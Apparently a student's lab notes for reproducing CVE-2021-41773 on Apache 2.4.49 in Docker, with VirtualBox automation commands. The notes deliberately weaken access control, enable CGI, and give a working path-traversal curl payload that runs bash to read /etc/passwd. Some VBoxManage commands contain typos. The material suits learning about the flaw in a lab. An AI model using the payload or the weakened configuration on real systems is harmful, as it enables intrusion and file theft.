# Cybertaak - CVE-2021-41773

## Debian machine 

* maak virtuele machine met VirtualBox (Debian 11)
* Username: osboxes |   Password: osboxes.org

### install docker

* do update:

        sudo apt update

* install components:

        sudo apt-get install apt-transport-https ca-certificates curl gnupg

* get latest docker gpg key:

        wget https://download.docker.com/linux/debian/gpg

* save key:

        sudo apt-key add gpg

* add repo:

        echo "deb [arch=amd64] https://download.docker.com/linux/debian $(lsb_release -cs) stable" | sudo tee -a /etc/apt/sources.list.d/docker.list

* do update again finally:

        sudo apt update

* install docker:

        sudo apt-get install docker-ce docker-ce-cli containerd.io

* check docker running status:

        sudo systemctl status docker

* check installed version:

        docker --version

### apache 2.4.49 

* install:

        sudo docker pull httpd:2.4.49

#### configuration

* run container:

        sudo docker run --name vuln-httpd -p 8080:80 -d httpd:2.4.49

* copy to /home/osboxes/.:

        sudo docker cp vuln-httpd:/usr/local/apache2/conf/httpd.conf .

* grep:

        grep -C4 -n "Require all denied" httpd.conf

* sed:

        sed "250s/denied/granted/" httpd.conf > httpd.new.conf

* copy new to old:

        sudo docker cp httpd.new.conf vuln-httpd:/usr/local/apache2/conf/httpd.conf

* restart container:

        sudo docker container restart vuln-httpd

* modify by hand:

        sudo nano httpd.conf

(change the line `Require all denied` to `Require all granted`)

#### configuration for RCE

* copy to /home/osboxes/.:

        sudo docker cp vuln-httpd:/usr/local/apache2/conf/httpd.conf .

* grep:

        grep -C4 -n "mod_cgi" httpd.conf

* sed:

        sed "184,187s/#//" httpd.conf > httpd.new.conf

* copy new to old:

        sudo docker cp httpd.new.conf vuln-httpd:/usr/local/apache2/conf/httpd.conf

* restart container:

        sudo docker container restart vuln-httpd

## Kali machine

* curl:

        curl -v 'http://localhost:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/bash' -d 'echo Content-Type: text/plain; echo; cat /etc/passwd' -H "Content-Type: text/plain"


## Automatisatie + VBoxManage

* List of existing VM's:

        BVoxManage list vms

* List of running VM's:

        VBoxManage list runningvms

* More details about running vm:

        VBoxManage lisr -l runningvms

### Create VM

* List of OS types:

        VBoxManage list ostypes

* create VM:

        VBoxManage createvm --name CyberSecTaakDebian --ostype Debian_64 --register

* info about VM:

        VBoxManage showvminfo CyberSecTaakDebian 

* configure VM:

        VBoxManage modifyvm CyberSecTaakDebian --cpus 2 --memory 2048 --vram 12

* grep memory info:

        VBoxManage showvminfo CyberSecTaakDebian | grep "Memory size"

* network setting:

        VBoxManage modifyvm CyberSecTaakDebian --nic1 bridged --brideadapter1 eth0

* create hd vdi:

        VBoxManage createhd --filename /C:/Users/User/Virtualbox VMs/CyberSecTaakDebian/CyberSecTaakDebian.vdi --size 5120 --variant Standard

* stockage controller:

        VBoxManage storagectl CyberSecTaakDebian --name "IDE Controller" --add ide --bootable on

* atache disk to controller:

        VBoxManage storageattach CyberSecTaakDebian --storagectl "IDE Controller" --port 0 --device 0 --type dvddrive --medium C:\Users\User\VirtualBox VMs\Debian_Server_Cyber_Taak\Debian 11 (64bit)

* start vm:

        VBoxManage startvm CyberSecTaakDebian